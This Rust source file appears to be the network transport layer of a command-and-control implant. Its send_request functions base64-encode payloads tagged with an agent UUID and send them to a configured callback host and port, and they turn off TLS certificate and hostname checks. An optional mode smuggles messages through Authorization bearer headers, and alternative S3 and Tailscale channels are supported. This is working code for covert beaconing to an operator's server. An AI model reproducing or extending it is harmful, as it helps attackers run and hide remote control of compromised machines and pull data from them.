use reqwest::blocking::Client;
use std::time::Duration;
use serde_json::Value;
use base64::{engine::general_purpose, Engine as _};
use crate::config;
use crate::s3_transport;
#[cfg(feature = "tailscale")]
use crate::tailscale_transport;


pub fn send_request(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        return tailscale_transport::send_request(payload);
    }
    if config::use_s3 {
        s3_transport::send_and_receive(payload)
    } else {
        send_request_internal(payload, true)
    }
}

pub fn send_request_raw(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        return tailscale_transport::send_request_raw(payload);
    }
    if config::use_s3 {
        s3_transport::send_and_receive(payload)
    } else {
        send_request_internal(payload, false)
    }
}

fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn std::error::Error>> {
    let encoded = if encode {
        let uuid = config::UUID.read().unwrap();
        let full_msg = format!("{}{}", *uuid, payload);
        general_purpose::STANDARD.encode(full_msg)
    } else {
        payload.to_string()
    };

    let url = format!(
        "{}://{}:{}/{}",
        if config::use_ssl { "https" } else { "http" },
        config::callback_host,
        config::callback_port,
        config::post_uri
    );

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()?;

    if config::use_jwt_bearer {
        crate::dlog!("http: GET {url} bearer_len={}", encoded.len());
        let res = client
            .get(&url)
            .header("Authorization", format!("Bearer {}", encoded))
            .header("User-Agent", config::user_agent)
            .timeout(Duration::from_secs(10))
            .send()
            .map_err(|e| {
                crate::dlog!("http: send err: {e}");
                e
            })?;

        let status = res.status();
        let auth_header = res
            .headers()
            .get("Authorization")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();
        crate::dlog!("http: status={status} auth_hdr_len={}", auth_header.len());

        let body = if auth_header.starts_with("Bearer ") {
            auth_header[7..].to_string()
        } else {
            auth_header
        };
        Ok(body)
    } else {
        crate::dlog!("http: POST {url} body_len={}", encoded.len());
        let res = client
            .post(&url)
            .header("Content-Type", "text/plain")
            .header("User-Agent", config::user_agent)
            .timeout(Duration::from_secs(10))
            .body(encoded)
            .send()
            .map_err(|e| {
                crate::dlog!("http: send err: {e}");
                e
            })?;

        let status = res.status();
        let body = res.text().map_err(|e| {
            crate::dlog!("http: body err: {e}");
            e
        })?;
        crate::dlog!("http: status={status} resp_len={}", body.len());
        Ok(body)
    }
}

pub fn send_request_with_response(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        return tailscale_transport::send_request_with_response(payload);
    }
    if config::use_s3 {
        s3_transport::send_and_receive_json(payload)
    } else {
        let response_text = send_request_internal(payload, true)?;
        let json: Value = serde_json::from_str(&response_text)?;
        Ok(json)
    }
}

#[allow(dead_code)]
pub fn send_request_with_response_raw(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        return tailscale_transport::send_request_with_response_raw(payload);
    }
    if config::use_s3 {
        s3_transport::send_and_receive_json(payload)
    } else {
        let response_text = send_request_internal(payload, false)?;
        let json: Value = serde_json::from_str(&response_text)?;
        Ok(json)
    }
}
